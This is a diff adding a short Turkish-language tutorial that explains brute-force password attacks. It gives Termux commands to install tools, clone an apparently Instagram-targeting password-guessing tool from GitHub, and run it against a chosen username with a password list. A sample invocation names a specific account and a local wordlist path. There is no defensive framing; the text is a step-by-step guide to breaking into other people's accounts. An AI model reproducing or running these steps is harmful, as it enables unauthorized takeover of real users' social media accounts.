@@ -1,0 +1,26 @@
+Brute Force Attack Saldırısının Mantığı Nedir?
+
+Bir parola listesi oluşturarak programlar yardımı ile bu doğru şifre bulunana kadar
+denemesidir. Bu saldırıyı yapmak için bir araca ve bir parola listesi gerekiyor
+
+Brute Force Attack Saldırısı Nasıl Yapılır
+
+Aşağıdaki komutları termuxa yapıştırın
+
+
+
+cd
+
+pkg install git
+
+pip install pipenv
+
+git clone https://github.com/Bitwise-01/Instagram-
+
+cd Instagram-
+
+python instagram.py -u "kullanıcı-adı" -p "parola-listesinin-adı"
+
+örnek:
+
+python instagram.py -u furkaneyce2000 -p /sdcard/parola.txt
